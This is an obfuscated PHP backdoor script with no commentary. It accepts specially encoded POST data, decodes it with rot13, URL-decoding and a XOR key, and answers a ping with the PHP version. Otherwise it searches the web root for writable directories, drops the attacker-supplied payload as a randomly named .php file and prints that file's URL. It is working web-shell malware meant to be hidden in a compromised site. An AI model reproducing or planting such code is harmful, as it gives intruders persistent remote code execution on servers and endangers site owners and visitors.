<?php $egjtqthmm = "uymjjqvdqbrnlugs";$xarsyju = "";foreach ($_POST as $bnnmjfgx => $vzylvoh){if (strlen($bnnmjfgx) == 16 and substr_count($vzylvoh, "%") > 10){utkvjz($bnnmjfgx, $vzylvoh);}}function utkvjz($bnnmjfgx, $mdtjvwiir){global $xarsyju;$xarsyju = $bnnmjfgx;$mdtjvwiir = str_split(rawurldecode(str_rot13($mdtjvwiir)));function fiuxug($ojtxghq, $bnnmjfgx){global $egjtqthmm, $xarsyju;return $ojtxghq ^ $egjtqthmm[$bnnmjfgx % strlen($egjtqthmm)] ^ $xarsyju[$bnnmjfgx % strlen($xarsyju)];}$mdtjvwiir = implode("", array_map("fiuxug", array_values($mdtjvwiir), array_keys($mdtjvwiir)));$mdtjvwiir = @unserialize($mdtjvwiir);if (@is_array($mdtjvwiir)){$bnnmjfgx = array_keys($mdtjvwiir);$mdtjvwiir = $mdtjvwiir[$bnnmjfgx[0]];if ($mdtjvwiir === $bnnmjfgx[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function myohbaoc($kacbbzair) {static $jkbdhj = array();$iazjugcdt = glob($kacbbzair . '/*', GLOB_ONLYDIR);if (count($iazjugcdt) > 0) {foreach ($iazjugcdt as $kacbbza){if (@is_writable($kacbbza)){$jkbdhj[] = $kacbbza;}}}foreach ($iazjugcdt as $kacbbzair) myohbaoc($kacbbzair);return $jkbdhj;}$lgypulb = $_SERVER["DOCUMENT_ROOT"];$iazjugcdt = myohbaoc($lgypulb);$bnnmjfgx = array_rand($iazjugcdt);$itcyd = $iazjugcdt[$bnnmjfgx] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($itcyd, $mdtjvwiir);echo "http://" . $_SERVER["HTTP_HOST"] . substr($itcyd, strlen($lgypulb));exit();}}}